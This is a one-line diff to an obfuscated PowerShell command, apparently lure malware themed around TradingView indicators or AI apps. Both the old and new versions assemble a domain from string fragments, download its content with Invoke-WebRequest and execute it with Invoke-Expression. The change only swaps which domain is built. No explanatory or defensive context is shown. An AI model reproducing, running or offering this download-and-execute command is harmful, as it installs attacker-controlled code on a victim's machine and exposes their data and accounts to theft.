@@ -1,1 +1,1 @@
-powershell -Command "$indicator='beta';$ai='app';$tradingview='.app';$d=$indicator+$ai+$tradingview;$r=iwr $d -UserAgent $indicator -UseBasicParsing;iex ([Text.Encoding]::UTF8.GetString($r.Content))"
+powershell -Command "$indicator='beta';$ai='app';$tradingview='.app';$d='indicator'+'beta'+$tradingview;$r=iwr $d -UserAgent $indicator -UseBasicParsing;iex ([Text.Encoding]::UTF8.GetString($r.Content))"
